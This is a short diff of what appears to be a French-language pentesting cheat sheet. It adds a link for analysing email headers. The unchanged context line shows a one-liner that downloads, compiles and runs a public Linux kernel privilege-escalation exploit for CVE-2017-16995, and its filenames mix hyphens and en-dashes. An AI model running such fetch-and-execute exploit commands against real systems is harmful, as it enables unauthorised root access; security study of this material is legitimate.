@@ -194,6 +194,8 @@ network:
 
 - Kernel exploit --> `wget https://raw.githubusercontent.com/kkamagui/linux-kernel-exploits/master/kernel-4.10.0-28-generic/CVE-2017-16995/CVE-2017-16995.c && gcc CVE-2017–16995.c -o CVE-2017–16995 && ./CVE-2017-16995`
 
+- Analyser un mail --> https://mailheader.org/
+
 
 ### Windows 
 
